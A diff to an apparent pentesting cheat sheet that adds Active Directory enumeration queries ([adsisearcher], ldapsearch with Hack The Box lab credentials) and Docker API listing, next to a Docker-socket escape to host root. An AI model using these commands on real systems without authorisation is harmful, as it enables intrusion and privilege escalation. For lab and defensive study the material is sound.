@@ -66,6 +66,20 @@ https://d47zm3.me/resources/infosec/reverse-shells/
 ldapsearch -LLL -x -H ldap://<domain fqdn> -b ‘’ -s base ‘(objectclass=*)’
 ldapsearch -x -h 10.10.10.161 -D 'htb\svc-alfresco' -w 's3rvice' -b 'CN=Users,DC=HTB,DC=LOCAL'
 
+[ldap query:adsisearcher]
+>> find domain computers not dc
+([adsisearcher]"(&(objectCategory=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))").findall()
+>> find domain controllers
+([adsisearcher]"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))").findall()
+>> find all domain computers object
+([adsisearcher]"(objectCategory=computer)").findall()
+>> find all domain users
+([adsisearcher]"(&(objectcategory=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))").findall()
+>> find specific domain users
+([adsisearcher]"(&(objectCategory=person)(objectClass=user)(cn=Dan*))").findall().Properties.adspath.replace("LDAP://","")
+>> Get samaccountname
+([adsisearcher]"(&(objectcategory=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))").findall().Properties.samaccountname
+
 [ad-ldap-enum]
 ad-ldap-enum.py -l 10.10.10.10 -d domain.local
 
@@ -473,6 +487,10 @@ docker -H tcp://10.10.25.34:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt s
 ./docker -H unix:///tmp/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
 >> using docker socket with curl
 https://betterprogramming.pub/about-var-run-docker-sock-3bfd276e12fd
+>> list containers
+curl -s localhost:8080/containers/json -H "Content-Type: json" | jq .[].Names
+>> list images
+curl -s localhost:8080/images/json -H "Content-Type: json" | jq .[].Names
 
 [mounting shares]
 mount -f cifs '//172.16.1.31/Shares' mnt/
